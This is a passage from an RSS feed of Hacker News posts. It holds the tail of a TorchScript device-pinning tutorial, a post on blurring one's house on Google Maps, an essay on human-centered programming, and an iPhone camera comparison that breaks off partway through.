  <span>_1</span> <span>=</span> <span>torch</span><span>.</span><span>arange</span><span>(</span><span>annotate</span><span>(</span><span>number</span><span>,</span> <span>_0</span><span>),</span> <span>dtype</span><span>=</span><span>None</span><span>,</span> <span>layout</span><span>=</span><span>0</span><span>,</span> <span>device</span><span>=</span><span>torch</span><span>.</span><span>device</span><span>(</span><span>"cuda:0"</span><span>),</span> <span>pin_memory</span><span>=</span><span>False</span><span>)</span>
  <span>return</span> <span>_1</span></code></pre></div>
<!-- raw HTML omitted -->
<blockquote>
  <p><strong>Tensors Created During Tracing Will Have Their Device Pinned</strong></p>
<p>This can be a significant performance and portability problem.</p>

</blockquote>

<h3 id="performance-and-portability">
  Performance and Portability
  <a href="#performance-and-portability">#</a>
</h3>
<p>If we later deserialize and run this TorchScript in <code>libtorch</code> the <code>arange</code> tensor will always be created on the device that is pinned — <code>torch.device("cpu")</code> or <code>torch.device("cuda:0")</code> in the examples above. If the rest of the model is running on a different device this can result in costly memory transfers and synchronization.</p>
<p>This device pinning issue extends to multi-GPU scenarios as well. If you have traced and exported a model on <code>cuda:0</code> and then run it on <code>cuda:1</code> you’ll see transfers and synchronization between the devices. Not good. Perhaps even worse, if such a model is run in an environment without any CUDA-capable device it will fail since <code>cuda:0</code> doesn’t exist.</p>
<blockquote>
  <p><strong>Replace Tensors Created During Execution With Parameters</strong></p>
<p>Tensors created in the execution path while tracing will have their device pinned. Depending on model logic, these can often be turned into Parameters created during construction.</p>

</blockquote>

<p>An example of the problem looks like this in Nsight Systems:</p>








<a href="https://paulbridger.com/posts/mastering-torchscript/images/pinned_devices.png">
    <figure>
        <img src="https://paulbridger.com/posts/mastering-torchscript/images/pinned_devices_hub20c76c57b334a1bd11edec46dac0166_414004_896x580_fill_box_top_2.png" width="896" height="580">
        <figcaption><small></small></figcaption>
    </figure>
</a>

<h3 id="tensor-subscript-mask-and-indexing-will-pin-devices">
  Tensor Subscript Mask and Indexing Will Pin Devices
  <a href="#tensor-subscript-mask-and-indexing-will-pin-devices">#</a>
</h3>
<p>Unlike their more explicit counterparts (<code>masked_select</code> and <code>index_select</code>), using tensor subscripting will pin the mask or indexes to the tracing device:</p>
<div><pre><code data-lang="python"><span>def</span> <span>forward</span><span>(</span><span>X</span><span>):</span>
    <span>return</span> <span>X</span><span>[</span><span>X</span> <span>&gt;</span> <span>1</span><span>]</span></code></pre></div>
<p>Generates this TorchScript:</p>
<div><pre><code data-lang="python"><span>def</span> <span>forward</span><span>(</span><span>X</span><span>:</span> <span>Tensor</span><span>)</span> <span>-&gt;</span> <span>Tensor</span><span>:</span>
  <span>_0</span> <span>=</span> <span>torch</span><span>.</span><span>to</span><span>(</span><span>torch</span><span>.</span><span>gt</span><span>(</span><span>X</span><span>,</span> <span>1</span><span>),</span> <span>dtype</span><span>=</span><span>11</span><span>,</span> <span>layout</span><span>=</span><span>0</span><span>,</span> <span>device</span><span>=</span><span>torch</span><span>.</span><span>device</span><span>(</span><span>"cpu"</span><span>),</span> <span>pin_memory</span><span>=</span><span>False</span><span>,</span> <span>non_blocking</span><span>=</span><span>False</span><span>,</span> <span>copy</span><span>=</span><span>False</span><span>,</span> <span>memory_format</span><span>=</span><span>None</span><span>)</span>
  <span>_1</span> <span>=</span> <span>annotate</span><span>(</span><span>List</span><span>[</span><span>Optional</span><span>[</span><span>Tensor</span><span>]],</span> <span>[</span><span>_0</span><span>])</span>
  <span>return</span> <span>torch</span><span>.</span><span>index</span><span>(</span><span>X</span><span>,</span> <span>_1</span><span>)</span></code></pre></div>
<!-- raw HTML omitted -->
<p>Whereas:</p>
<div><pre><code data-lang="python"><span>def</span> <span>forward</span><span>(</span><span>X</span><span>):</span>
    <span>return</span> <span>X</span><span>.</span><span>masked_select</span><span>(</span><span>X</span> <span>&gt;</span> <span>1</span><span>)</span></code></pre></div>
<p>Generates this TorchScript:</p>
<div><pre><code data-lang="python"><span>def</span> <span>forward</span><span>(</span><span>X</span><span>:</span> <span>Tensor</span><span>)</span> <span>-&gt;</span> <span>Tensor</span><span>:</span>
  <span>_0</span> <span>=</span> <span>torch</span><span>.</span><span>masked_select</span><span>(</span><span>X</span><span>,</span> <span>torch</span><span>.</span><span>gt</span><span>(</span><span>X</span><span>,</span> <span>1</span><span>))</span>
  <span>return</span> <span>_0</span></code></pre></div>
<!-- raw HTML omitted -->
<p>The same pattern holds for <code>tensor[indexes]</code> and <code>tensor.index_select(0, indexes)</code>. This device pinning carries the same performance and portability risks as noted above.</p>
<blockquote>
  <p><strong>Replace Tensor Subscripting With <code>masked_select</code> and <code>indexed_select</code></strong></p>
<p>Subscript-based masking and indexing will always pin the tracing device into generated TorchScript. :(</p>

</blockquote>

<h2 id="direct-graph-modification">
  Direct Graph Modification
  <a href="#direct-graph-modification">#</a>
</h2>
<p>Once we’ve used <code>torch.jit.script</code> or <code>torch.jit.trace</code> to generate a ScriptModule or ScriptFunction we can use <code>.graph</code>, <code>.inlined_graph</code> or <code>.code</code> to understand exactly what TorchScript has been generated. Though it has an entirely undocumented interface it is possible (and fun) to access and modify the generated TorchScript AST directly via the <code>.graph</code> method.</p>
<p>The most useful parts of the API are defined in <a href="https://github.com/pytorch/pytorch/blob/master/torch/csrc/jit/python/python_ir.cpp">torch/csrc/jit/python/python_ir.cpp</a>. As you can see, all the basic functionality is present for finding and changing the graph nodes you want. If you change nodes or arguments and then persist the module your subsequent TorchScript load and inference will reflect your changes, though modules cannot be changed recursively in this way (<code>torch.jit.freeze</code> can be useful here).</p>
<p>An example of the kind of graph modification that is possible:</p>
<div><pre><code data-lang="python"><span>def</span> <span>undevice</span><span>(</span><span>tsc</span><span>):</span>
    <span># use ::to variant which does not hardcode device</span>
    <span>for</span> <span>to_node</span> <span>in</span> <span>tsc</span><span>.</span><span>graph</span><span>.</span><span>findAllNodes</span><span>(</span><span>'aten::to'</span><span>):</span>
        <span>i</span><span>,</span> <span>dtype</span><span>,</span> <span>layout</span><span>,</span> <span>device</span><span>,</span> <span>pin_mem</span><span>,</span> <span>non_blocking</span><span>,</span> <span>copy</span><span>,</span> <span>mem_format</span> <span>=</span> <span>list</span><span>(</span><span>to_node</span><span>.</span><span>inputs</span><span>())</span>
        <span>to_node</span><span>.</span><span>removeAllInputs</span><span>()</span>
        <span>for</span> <span>a</span> <span>in</span> <span>[</span><span>i</span><span>,</span> <span>dtype</span><span>,</span> <span>non_blocking</span><span>,</span> <span>copy</span><span>,</span> <span>mem_format</span><span>]:</span>
            <span>to_node</span><span>.</span><span>addInput</span><span>(</span><span>a</span><span>)</span>

    <span>for</span> <span>constant</span> <span>in</span> <span>tsc</span><span>.</span><span>graph</span><span>.</span><span>findAllNodes</span><span>(</span><span>'prim::Constant'</span><span>):</span>
        <span>if</span> <span>not</span> <span>constant</span><span>.</span><span>hasUses</span><span>():</span>
            <span>constant</span><span>.</span><span>destroy</span><span>()</span></code></pre></div>
<p>The above code will modify a traced graph, changing <code>aten::to</code> to use an overload which doesn’t change memory location.</p>
<p>But what is this really useful for? As an undocumented API you’d be unwise to use this capability in a production pipeline unless you like maintenance coding. I would only recommend it for research, as in the above example which I used to understand and profile the transfer/synchronization behavior of tensor subscripting.</p>
<blockquote>
  <p><strong>Don’t Bother With Direct Graph Modification</strong></p>
<p>For legitimate production use-cases you can almost always find a way to modify your model code to generate the TorchScript you want.</p>

</blockquote>

<h2 id="rewrite-for-onnxtensorrt-export">
  Rewrite for ONNX/TensorRT Export
  <a href="#rewrite-for-onnxtensorrt-export">#</a>
</h2>
<p>You can get some <a href="https://paulbridger.com/posts/video-analytics-deepstream-pipeline/#stage-3-hacked-deepstream-mdash-80-tensorrt-20-torchscript">awesome results with TensorRT</a> but exporting a model from Pytorch to TensorRT is far from a sure thing. The export path to ONNX and then to TensorRT can fail due to missing or incompatible operations at either step and this can be frustrating.</p>
<p>After the obligatory Google search, I’ve found a reasonable hail-mary approach is to rewrite your tensor processing code to avoid unsupported operators. I can’t give general advice for this but let me show you an example of how this can be possible: <code>repeat_interleave</code>.</p>
<div><pre><code data-lang="python"><span>class</span> <span>RI</span><span>(</span><span>torch</span><span>.</span><span>nn</span><span>.</span><span>Module</span><span>):</span>
    <span>def</span> <span>forward</span><span>(</span><span>self</span><span>,</span> <span>X</span><span>,</span> <span>repeat</span><span>):</span>
        <span>return</span> <span>X</span><span>.</span><span>repeat_interleave</span><span>(</span><span>repeat</span><span>,</span> <span>dim</span><span>=</span><span>0</span><span>)</span>

<span>inputs</span> <span>=</span> <span>(</span><span>torch</span><span>.</span><span>arange</span><span>(</span><span>5</span><span>),</span> <span>torch</span><span>.</span><span>tensor</span><span>(</span><span>3</span><span>))</span>
<span>torch</span><span>.</span><span>onnx</span><span>.</span><span>export</span><span>(</span><span>RI</span><span>(),</span> <span>inputs</span><span>,</span> <span>'please_work.onnx'</span><span>,</span> <span>opset_version</span><span>=</span><span>11</span><span>)</span></code></pre></div>
<p>Doesn’t work:</p>
<div><pre><code data-lang="bash">RuntimeError: Exporting the operator repeat_interleave to ONNX opset version <span>11</span> is not supported. Please open a bug to request ONNX <span>export</span> support <span>for</span> the missing operator.</code></pre></div>
<p>However, the behavior of <code>repeat_interleave</code> with a fixed <code>dim</code> argument can be replicated in a form that will export to ONNX …</p></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://paulbridger.com/posts/mastering-torchscript/">https://paulbridger.com/posts/mastering-torchscript/</a></em></p>]]>
            </description>
            <link>https://paulbridger.com/posts/mastering-torchscript/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24941642</guid>
            <pubDate>Fri, 30 Oct 2020 12:46:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to blur your house on Google Maps and why it might be a bad idea]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24941611">thread link</a>) | @jastuks
<br/>
October 30, 2020 | https://blog.xeovo.com/how-to-blur-your-house-on-google-maps-and-why-it-might-be-a-bad-idea/ | <a href="https://web.archive.org/web/*/https://blog.xeovo.com/how-to-blur-your-house-on-google-maps-and-why-it-might-be-a-bad-idea/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
<div>
<article>

<figure>
<img srcset="https://blog.xeovo.com/content/images/size/w300/2020/10/how-to-hide-your-house-from-google-maps.png 300w,
                            https://blog.xeovo.com/content/images/size/w600/2020/10/how-to-hide-your-house-from-google-maps.png 600w,
                            https://blog.xeovo.com/content/images/size/w1000/2020/10/how-to-hide-your-house-from-google-maps.png 1000w,
                            https://blog.xeovo.com/content/images/size/w2000/2020/10/how-to-hide-your-house-from-google-maps.png 2000w" sizes="(max-width: 800px) 400px,
                        (max-width: 1170px) 1170px,
                            2000px" src="https://blog.xeovo.com/content/images/size/w2000/2020/10/how-to-hide-your-house-from-google-maps.png" alt="How to blur your house on Google Maps and why it might be a bad idea">
</figure>
<section>
<div>
<p>Recently we noticed many popular blogs covering this topic and recommending to readers to blur their house on "Google Street View". At first glance, it might seem like a no-brainer, and you should do it to improve your privacy.</p><p>But this is not so straightforward and most likely will cause more problems. We want to cover all cons and pros and why you might not need to blur your house on Google Maps.</p><h3 id="cons-">Cons:</h3><ol><li>This is permanent. You won't be able to unblur your house. There will be no more updates in your area.</li><li>Google is not the only one website having a picture of your house. Bing, Apple Maps, or Yandex is a good example. Let's also add here Redfin, Zillow, and other real estate websites.</li><li>This might complicate selling your house in the future.</li><li>Most likely, your house will be the only one blurred in the block, which might bring more unwanted attention.</li></ol><h3 id="unless-you-live-in-germany-">Unless you live in Germany...</h3><figure><img src="https://blog.xeovo.com/content/images/2020/10/no-streetview-in-germany-1.png" alt="" srcset="https://blog.xeovo.com/content/images/size/w600/2020/10/no-streetview-in-germany-1.png 600w, https://blog.xeovo.com/content/images/2020/10/no-streetview-in-germany-1.png 768w" sizes="(min-width: 720px) 720px"></figure><p>Google map shows quite well how much Germans value their privacy. After the launch of "Street View", a lot of people and politicians were unhappy with the fact that a foreign country is going to have access to the images of Germans' houses. </p><p>Even though Google blur license plates and faces it was not enough for Germans. Google had to implement the possibility to blur houses.</p><p>The number of requests was so high that Google gave up. So it became a new norm in Germany. Google still have Street View in big cities, but other places are not getting updated anymore and most likely will be removed in the future.</p><h3 id="pros-">Pros:</h3><ol><li>You want to improve your house security. It is a powerful tool for burglars to reconnaissance. They can spot your security cameras, gates and find hiding spots without showing at your house. Remember that your house is still visible from the satellite view.</li><li>You want to improve your privacy (don't forget about cons).</li><li>You don't want Google to have images of your house.</li></ol><h3 id="how-to-blur-my-house">How to blur my house?</h3><figure><img src="https://blog.xeovo.com/content/images/2020/10/2020-10-29_18Z2g-2.png" alt="" srcset="https://blog.xeovo.com/content/images/size/w600/2020/10/2020-10-29_18Z2g-2.png 600w, https://blog.xeovo.com/content/images/2020/10/2020-10-29_18Z2g-2.png 925w" sizes="(min-width: 720px) 720px"></figure><ol><li>Search your address in Google Maps.</li><li>Drag and drop yellow guy from the right bottom side.</li><li>Get a good view of your house and click "Report problem" on the right bottom side.</li><li>Select that you want to blur "My home" and fill other required fields.</li><li>Submit and wait. Google might request more information.</li></ol><h3 id="conclusion-">Conclusion:</h3><p>We think and believe that every person should have the right to blur their houses on any public map. Just remember that you might achieve the "Streisand effect" by doing this and bring more attention. </p>
</div>
</section>
<section>
<h3>Xeovo Newsletter</h3>
<p>Stay up to date with the latest Xeovo updates, tutorials and articles.</p>
<form data-members-form="subscribe">

<p><strong>Great!</strong> Check your inbox and click the link to confirm your subscription.
</p>
<p>
Please enter a valid email address!
</p>
</form>
</section>
</article>
</div>
</div></div>]]>
            </description>
            <link>https://blog.xeovo.com/how-to-blur-your-house-on-google-maps-and-why-it-might-be-a-bad-idea/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24941611</guid>
            <pubDate>Fri, 30 Oct 2020 12:42:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Mega Monster Party: A web-based Mario Party-like game for Halloween /Multiplayer]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24941499">thread link</a>) | @morgam
<br/>
October 30, 2020 | https://airconsole.io/MMP | <a href="https://web.archive.org/web/*/https://airconsole.io/MMP">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://airconsole.io/MMP</link>
            <guid isPermaLink="false">hacker-news-small-sites-24941499</guid>
            <pubDate>Fri, 30 Oct 2020 12:26:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Human-Centered Programming]]>
            </title>
            <description>
<![CDATA[
Score 18 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24941429">thread link</a>) | @todsacerdoti
<br/>
October 30, 2020 | http://codepunk.io/human-centered-programming/ | <a href="https://web.archive.org/web/*/http://codepunk.io/human-centered-programming/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <!-- Begin MailChimp Signup Form -->
            
            
            
            <!--End mc_embed_signup-->
            <blockquote>
  <p>Michael,</p>
  
  <p>Thanks for your interest in L3-AI! We're excited to feature your presentation. </p>
  
  <p>Would you be able to condense your proposal into a 5 minute lightning talk?  If this sounds good to you, I'll schedule next steps [...]</p>
</blockquote>

<p>Actually... I submitted to do a lightning talk, so no problem, right? I've <a href="https://codepunk.io/why-i-love-lightning-talks/">mentioned before</a> that too often people see lightning talks as a consolation price, but I use them to test out new ideas, and it requires a special set of skills to get those ideas across in a short amount of time.</p>

<p>Unlike in the past where my focus was explicitly on the Microsoft Bot Framework, I had recently expanded to a greater analysis of frameworks like <a href="https://rasa.com/">Rasa</a> and <a href="https://www.botkit.ai/">Ben Brown's Botkit</a>. After conversations with Chris Mullins at Microsoft, I really started applying a more critical eye towards the frameworks I'd been using, but was taking for granted.</p>

<p>Specifically, I was unconvinced that the way frameworks were being built constituted an appropriate approach. We're not talking about programming-centric frameworks. Conversational software is about a conversation-first approach, and the frameworks for building conversational software should allow the programmer to program in a way that represents how a conversation flows. (Brown's Botkit does a good job of this with the names of its methods and classes.)</p>

<p>I decided to built a chatbot framework from scratch in order to explore these ideas and settled on conversation analysis as a theory to apply. This led to several presentations over the course of the Summer, including Rasa's L3-AI. I expanded on this presentation in latter virtual conferences, and being influenced by the pandemic, politics, and the overall despair of the state of affairs, this expanded presentation took quite an unexpected turn.</p>

<hr>

<p>LinkedIn can be a valuable tool and a painful platform all in the same minute. The more active you become, the more noticed you are, and the more likely you'll start getting random InMail's and connection invites from people you don't know. If you're lucky recruiters will use the InMail feature where they have a limited number of cold requests. Mostly, though, they just send you a random connection request and put their message in the invite to try to avoid burning their InMails.</p>

<p>I have a general rule: If I don't know you and you send a connection request without a personal message, I ignore it outright. If it does have a personal message, I hope it's relevant.</p>

<p>When I received an invite from <a href="https://www.linkedin.com/in/brian-greenwald-108/">Brian Greenwald</a>, he at least followed the appropriate etiquette. The Vice President of Business Development for <a href="https://generateimpact.com/">Generate Impact</a>, Brian was a new addition to the unfolding story of Chiedo Labs—a local Harrisonburg development shop spawned from the machinations of James Madison University student Chiedo John. I was familiar Chiedo Labs from some local tech circles and was connected to Chiedo and a few employees through LinkedIn. Chiedo and I both spoke at Nation JS in Washington, DC the previous year and had exchanged a few emails.</p>

<p>Chiedo was always a faith-based person, while Chiedo Labs—although a good group of people—was fighting an uphill battle trying to distinguish itself in custom development where its a race to the bottom on client pricing. So it made sense when the company converted from Chiedo Labs to Generate Impact and began a concentrated effort towards focusing on helping non-profits.</p>

<p>But it wasn't long before Chiedo jumped ship to greener pastures at GitHub, while Brian and Mike Forster (Generate Impact president) were piloting the transformation of the company.</p>

<hr>

<blockquote>
  <p>Hi Michael! That’s awesome that you know Chiedo! He was one of my clients and [as] fortune would have it we ended up merging what I do with Generate Impact. [...] I would love to meet for coffee - seems like it will be a while unfortunately. We are hunkered down here in Earlysville. Would love to learn about what you are doing...maybe we can schedule a zoom call sometime.</p>
</blockquote>

<p>I agreed.</p>

<p>I also didn't expect a Zoom call to be scheduled immediately for the following week. It smelled a little of a cold call, which I'm never receptive to. Still, I was familiar with the company and some of the team members, so at worst, I would fly into the meeting with little need to put a lid on my opinions or personality.</p>

<p>My conversation with Brian came just after the COVID-19 pandemic began shutting down much of the United States, and I had already begun reading articles about the reshaping of economic needs and drivers. What started as a discussion of engineering proficiency, DevOps, and business-oriented IT processes escalated into the public good side of non-profits, B-corps, and the fundamentally optimistic assumption that <em>something has to give</em>. Corporations cannot continue on an infinite growth curve, and the pandemic represented an unprecedented opportunity to hit reset on corporate values and strive for something more than the upwards extraction of wealth.</p>

<p>Having previously interviewed enterprise architect Bryan Betts—someone who has spend most of his career in public service—I remember my colleague asking him about a hypothetical situation of communicating to leadership the ROI of certain better processes and planning.</p>

<blockquote>
  <p>Sometimes its not about the return on investment; Sometimes its just about doing the right thing, and there's value in that alone.</p>
</blockquote>

<p>From Brian Greenwald's side, he had been working for quite some time on the concept of a benevolent business model—an economic and business planning model that focused on success through the lens of greater inclusiveness and understanding of externalities rather than pure financial extraction—a model that seeks sustainability and equitability over exponential growth. Brian and I connected enough on a philosophical level that he introduced me to Generate Impact president Mike Forster to further the discuss on the positive technological impact on local businesses and communities. What emerged was a vision of enabling public good through technology, but from the local-first, sustainability approach that has permeated environmental movements—an acknowledgement that a successful path forward in the new normal consisted of an interrelated approach combining people, processes, and technology.</p>

<blockquote>
  <p>The Benevolent Business Model is anchored in the principle that all human activity exists (or SHOULD exist) to fulfill benevolent human needs. By that principle, a business exists to first CONTRIBUTE to the community it exists in and is building as opposed to focusing on gathering and EXTRACTING as many resources as possible. In other words, profit becomes the enabler of a collective vision of well-being as opposed to the end goal itself.</p>
  
  <p>Of course, the irony of this approach, particularly in the world we are living in today, is that focusing on the benevolence of EVERY member of the business community is MORE likely to be a strategic advantage and thus lead to more success and profit than the traditional "business as an army going to battle" approach, where victory is possible, but in the long run the cost to society is high.</p>
</blockquote>

<p>We can't forget about the people.</p>

<hr>

<p><img src="http://codepunk.io/content/images/2020/10/hcp-1.png" alt="Open Sector"></p>

<p>Typically when we talk about economic sectors, the focus is generally on the public and private sectors, and most don't consider if there is anything else on the outer boundaries. But recent analyses by market-watchers like <a href="https://www.exponentialview.co/">Azeem Azar</a> have pointed out the ever-growing sector (and importance) of open source software and technology. We’re used to hearing about the public sector and the private sector, what has been continuing to gain stream is this idea of an "open" sector.</p>

<p>COVID-19 has shown us the value of open data, and how that sharing can speed up understanding and innovation. In fact, open source software, open data, crowd-sourcing solutions, and crowd-funding projects, combined with efforts like GitHub Sponsors, Patreon, and Ko-Fi are carving out a sector that isn’t quite public, but isn’t private either. It’s an open, more democratic sector for a society looking to advance common goals.</p>

<p>This open sector is more prevalent in the technology industry than anywhere else, and it feeds both the private and public sector, such as open source software enabling and enhancing companies in either or those sectors. In fact, it feels like we've come full circle back to the original hackers of the 70's and 80's—producing software in a left-libertarian form of mutualism.</p>

<p>But oftentimes, our technology accelerates faster than our morality, and we occasionally need to step back and reevaluate our positions. For example, there is a disconnect between the programmers and researchers working hard on facial recognition software for the advancement of the theories and technology, and the fundamentally immoral use of facial recognition software in racial profiling and identifying protesters.</p>

<p>If you're at all familiar with <a href="https://logicmag.io/">Logic Magazine</a>, you've read some of the more significant techno-societal ponderings that are invading Silicon Valley's philosophical outlook, such as Astra Taylor's take down of the "security" of capitalism in <a href="https://logicmag.io/security/the-insecurity-machine/"><em>The Insecurity Machine</em></a>, which shows how technology is applied not to create more security for individuals, but to enhance greater security for ownership.</p>

<p><img src="http://codepunk.io/content/images/2020/10/hcp-2.png" alt="Human-Centered Programming"></p>

<p>Human-centered programming is a way of thinking about software that is different from the traditional <em>programmers can do whatever they want because technology is agnostic</em> view. To this respect, programming and technology consist of three important components: code, culture, and conscience. These three components can best be viewed in the traditional triangle trope of related ideas. Like all other triangle diagrams, it implies an interconnectedness between elements.</p>

<p>Code enables culture and culture defines how we code, but without conscience, we won’t fully understand the impact of the code that we write or the negative directions that our culture …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://codepunk.io/human-centered-programming/">http://codepunk.io/human-centered-programming/</a></em></p>]]>
            </description>
            <link>http://codepunk.io/human-centered-programming/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24941429</guid>
            <pubDate>Fri, 30 Oct 2020 12:17:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Comparing the cameras on the iPhone 12 Pro, 11, XS, 6, and SE]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24941356">thread link</a>) | @joshuawithers
<br/>
October 30, 2020 | https://joshwithers.blog/2020/10/30/comparing-the-cameras.html | <a href="https://web.archive.org/web/*/https://joshwithers.blog/2020/10/30/comparing-the-cameras.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
      

<p>I upgraded my daily carry computer, or what us old people call a phone, to an iPhone 12 Pro this week. Upon clicking the shutter a few times I could see there was a big difference in the new camera, but I wanted to compare photos to former iPhone cameras. So I pulled out all the old iPhones in the house and took the same photo on each one. It worked out pretty good as the four cameras were each mostly two years apart in release dates.</p>

<p><img src="https://joshwithers.blog/uploads/2020/33359e0d1c.jpg"></p>

<h2 id="control-notes">Control notes</h2>

<p>All photos were taken on the iPhone with a fresh install, no apps, or settings changed, no iCloud logged in. I simply tapped to focus and expose inside the default camera app, and turned off flash for consistency. All phones were held in a Peak Design Travel Tripod with the phone attachement. I tried to keep the framing consistent, but if it’s not, either the iPhone lens placement changed, or this free blog post doesn’t live up to even my standards. The iPhone SE is the first generation SE, the 12 is a 12 Pro. Taken with default settings including HDR/Smart HDR/HDR 3, on the 1x lens. The only edits made are to the HEIC files taken on cameras which save HEIC, those files have been converted to JPG using MacOS Automator.</p>

<p>You may want to right click on images and open in a new window to see full resolution, and honestly, I’m unsure if micro.blog actually compresses and/or resizes files so if you can still read this line I haven’t edited with original uploads to somewhere else.</p>

<h2 id="cameras-used">Cameras used</h2>

<ul>
<li>iPhone 6, released September 19, 2014, 8MP f/2.2</li>
<li>iPhone SE, released March 31, 2016, 12.2 MP f/2.2</li>
<li>iPhone XS, released September 21, 2018, 12MP ƒ/1.8 lens</li>
<li>iPhone 11 (for one Night Mode photo), released September 20, 2019, 12MP ƒ/1.8 lens</li>
<li>iPhone 12 Pro, released October 16, 2020, 12MP ƒ/1.6 lens</li>
</ul>

<p>Here’s a comparison of the four cameras as Apple sees fit.</p>

<p><img src="https://joshwithers.blog/uploads/2020/cf5392dd3a.jpg"></p>

<p>Let’s look at the photos…</p>

<h2 id="landscape-photo">Landscape photo</h2>

<p><strong>iPhone 6 Landscape photo</strong>
<img src="https://joshwithers.blog/uploads/2020/ac2551815b.jpg"></p>

<p><strong>iPhone SE Landscape photo</strong>
<img src="https://joshwithers.blog/uploads/2020/7744ffd03a.jpg"></p>

<p><strong>iPhone XS Landscape photo</strong>
<img src="https://joshwithers.blog/uploads/2020/1b4e4198c3.jpg"></p>

<p><strong>iPhone 12 Pro Landscape photo</strong>
<img src="https://joshwithers.blog/uploads/2020/93e559ff99.jpg"></p>

<h2 id="sunset-photo">Sunset photo</h2>

<p><strong>iPhone 6 Sunset photo</strong>
<img src="https://joshwithers.blog/uploads/2020/66970253a9.jpg"></p>

<p><strong>iPhone SE Sunset photo</strong>
<img src="https://joshwithers.blog/uploads/2020/9e69e23ac5.jpg"></p>

<p><strong>iPhone XS Sunset photo</strong>
<img src="https://joshwithers.blog/uploads/2020/dd0be82c4f.jpg"></p>

<p><strong>iPhone 12 Pro Sunset photo</strong>
<img src="https://joshwithers.blog/uploads/2020/1a504277bb.jpg"></p>

<h2 id="self-portrait">Self-portrait</h2>

<p><strong>iPhone 6 Self-portrait</strong>
<img src="https://joshwithers.blog/uploads/2020/9c914485b4.jpg"></p>

<p><strong>iPhone SE Self-portrait</strong>
<img src="https://joshwithers.blog/uploads/2020/b209159beb.jpg"></p>

<p><strong>iPhone XS Self-portrait</strong>
<img src="https://joshwithers.blog/uploads/2020/3ec4eab155.jpg"></p>

<p><strong>iPhone 12 Pro Self-portrait</strong>
<img src="https://joshwithers.blog/uploads/2020/75790aaae0.jpg"></p>

<h2 id="selfie-camera">Selfie camera</h2>

<p><strong>iPhone 6 Selfie camera photo</strong>
<img src="https://joshwithers.blog/uploads/2020/ba2688deeb.jpg"></p>

<p><strong>iPhone SE Selfie camera photo</strong>
<img src="https://joshwithers.blog/uploads/2020/ff7625d5b1.jpg"></p>

<p><strong>iPhone XS Selfie camera photo</strong>
<img src="https://joshwithers.blog/uploads/2020/af5d3c77cf.jpg"></p>

<p><strong>iPhone 12 Pro Selfie camera photo</strong>
<img src="https://joshwithers.blog/uploads/2020/62f90357e9.jpg"></p>

<h2 id="a-detail-photo">A detail photo</h2>

<p><strong>iPhone 6 detail photo</strong>
<img src="https://joshwithers.blog/uploads/2020/4e3bbbdd07.jpg"></p>

<p><strong>iPhone SE detail photo</strong>
<img src="https://joshwithers.blog/uploads/2020/91a2a06860.jpg"></p>

<p><strong>iPhone XS detail photo</strong>
<img src="https://joshwithers.blog/uploads/2020/f2e99cbb80.jpg"></p>

<p><strong>iPhone 12 Pro detail photo</strong>
<img src="https://joshwithers.blog/uploads/2020/0c169bfc4e.jpg"></p>

<h2 id="portrait-mode">Portrait mode</h2>

<p><strong>iPhone 6 Portrait</strong>
<img src="https://joshwithers.blog/uploads/2020/1ec2870da1.jpg"></p>

<p><strong>iPhone SE Portrait</strong>
<img src="https://joshwithers.blog/uploads/2020/bc5caf3172.jpg"></p>

<p><strong>iPhone XS Portrait mode</strong>
<img src="https://joshwithers.blog/uploads/2020/155e980b41.jpg"></p>

<p><strong>iPhone 12 Pro Portrait mode</strong>
<img src="https://joshwithers.blog/uploads/2020/9d115200f1.jpg"></p>

<h2 id="blue-light">Blue light</h2>

<p><strong>iPhone 6 Blue light photo</strong>
<img src="https://joshwithers.blog/uploads/2020/d08c621c0c.jpg"></p>

<p><strong>iPhone SE Blue light photo</strong>
<img src="https://joshwithers.blog/uploads/2020/cf41e6f448.jpg"></p>

<p><strong>iPhone XS Blue light photo</strong>
<img src="https://joshwithers.blog/uploads/2020/e687ea4f2d.jpg"></p>

<p><strong>iPhone 12 Pro Blue light photo</strong>
<img src="https://joshwithers.blog/uploads/2020/9c33781955.jpg"></p>

<h2 id="maximum-digital-zoom-in-blue-light">Maximum digital zoom in blue light</h2>

<p><strong>iPhone 6 zoomed to maximum digital zoom</strong>
<img src="https://joshwithers.blog/uploads/2020/a66a45ad92.jpg"></p>

<p><strong>iPhone SE zoomed to maximum digital zoom</strong>
<img src="https://joshwithers.blog/uploads/2020/288c93fe83.jpg"></p>

<p><strong>iPhone XS zoomed to maximum digital zoom</strong>
<img src="https://joshwithers.blog/uploads/2020/06d361d986.jpg"></p>

<p><strong>iPhone 12 Pro zoomed to maximum digital zoom</strong>
<img src="https://joshwithers.blog/uploads/2020/f4b2655081.jpg"></p>

<h2 id="night-mode-or-a-night-photo-for-cameras-without-night-mode">Night Mode, or a night photo for cameras without Night Mode</h2>

<p><strong>iPhone 6 Night photo</strong>
<img src="https://joshwithers.blog/uploads/2020/4ff032bb76.jpg"></p>

<p><strong>iPhone SE Night photo</strong>
<img src="https://joshwithers.blog/uploads/2020/c9fb9e6717.jpg"></p>

<p><strong>iPhone XS Night photo</strong>
<img src="https://joshwithers.blog/uploads/2020/4b3ffc1d42.jpg"></p>

<p><strong>iPhone 11 (not Pro) Night Mode photo</strong>
<img src="https://joshwithers.blog/uploads/2020/43025298db.jpg"></p>

<p><strong>iPhone 12 Pro Night Mode photo</strong>
